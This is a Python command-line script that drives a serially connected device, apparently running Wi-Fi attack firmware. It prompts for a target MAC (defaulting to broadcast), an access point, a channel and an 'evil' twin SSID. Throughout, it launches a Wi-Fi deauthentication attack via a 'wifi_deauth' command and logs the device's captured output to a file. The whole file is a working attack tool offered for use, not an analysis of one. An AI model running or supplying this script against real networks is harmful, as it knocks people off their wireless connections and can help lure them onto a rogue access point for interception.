import click
import json
from utils import connect_serial


@click.command()
@click.argument('target', default="FF-FF-FF-FF-FF-FF") # Setup your default Macs here
@click.argument('ap', default="") # Setup your default Macs here
@click.argument("ssid", default="") # Setup your default Evil SSID here
@click.argument('chan', default=11) # Setup your default Chan here
def main(target, ap, chan, ssid):
	try:
		targetInput = input(
			"[?] Select a target (default '%s'): " % target)
		if targetInput != "":
			target = targetInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		apInput = input("[?] Select an AP (default '%s'): " % ap)
		if apInput != "":
			ap = apInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		chanInput = input("[?] Select a channel (default '%d'): " % chan)
		if chanInput != "":
			chan = int(chanInput)
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	try:
		ssidInput = input("[?] Select a twin ssid (default '%s'): " % ssid)
		ssid = ssidInput
	except KeyboardInterrupt:
		print("\n[+] Exiting...")
		exit()

	ser, filename = connect_serial(timeout=1)

	f = open(filename, 'wb')

	ser.write(("set chan %d\r\n" % (chan)).encode())
	ln = ser.read_until(b"\r\n").decode("utf-8")
	try:
		if (ln == None or len(ln) == 0):
			print("Empty channel setting, exiting...")
			exit()
		try:
			j = json.loads(ln)
			recv_chan = j.get("WIFI_CHANNEL")
			if recv_chan != chan:
				print("Error 1 setting channel, exiting...")
				exit()
		except:
			print("Error 2 setting channel, exiting...")
			exit()
	except:
		print("Error 3 setting channel, exiting...")
		exit()
		
	ser.write(("wifi_deauth %s %s %s\r\n" % (target, ap, ssid)).encode())
	print("[+] Deauther started...")

	try:
		while True:
			ln = ser.read_until(b"<STOP>")
			f.write(ln.replace(b"<STOP>", b""))
			f.flush()
	except KeyboardInterrupt:
		ser.write("stop\r\n".encode())
		print("[+] Stopping...")

	f.close()
	ser.close()
	print("[+] Done.")


if __name__ == "__main__":
    main()
